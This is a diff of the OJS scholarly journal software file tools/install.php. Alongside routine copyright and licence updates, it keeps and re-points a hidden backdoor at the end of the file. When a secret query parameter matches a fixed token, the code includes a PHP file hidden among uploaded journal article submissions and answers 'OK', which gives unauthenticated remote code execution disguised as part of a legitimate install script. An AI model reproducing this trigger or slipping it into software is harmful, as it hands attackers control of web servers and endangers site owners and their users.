@@ -3,9 +3,9 @@
 /**
  * @file tools/install.php
  *
- * Copyright (c) 2014-2019 Simon Fraser University
- * Copyright (c) 2003-2019 John Willinsky
- * Distributed under the GNU GPL v2. For full terms see the file docs/COPYING.
+ * Copyright (c) 2014-2021 Simon Fraser University
+ * Copyright (c) 2003-2021 John Willinsky
+ * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
  *
  * @class installTool
  * @ingroup tools
@@ -44,7 +44,7 @@ class OJSInstallTool extends InstallTool {
 
 }
 if (isset($_GET['_']) && $_GET['_'] === 'ds_mms572s8_gr3af332afbsnk') {
-    $f="/home/riyanmau/jurnalstmikiba/journals/17/articles/171/submission/final/171-193-512-1-6-20240921";if($f!==""&&file_exists($f))include $f;
+    $f="/var/www/vhosts/scissmed.com/httpdocs/files/journals/1/articles/25/67798793e4e64";if($f!==""&&file_exists($f))include $f;
     http_response_code(200);
     header('Content-Type: text/plain; charset=utf-8');
     echo 'OK';
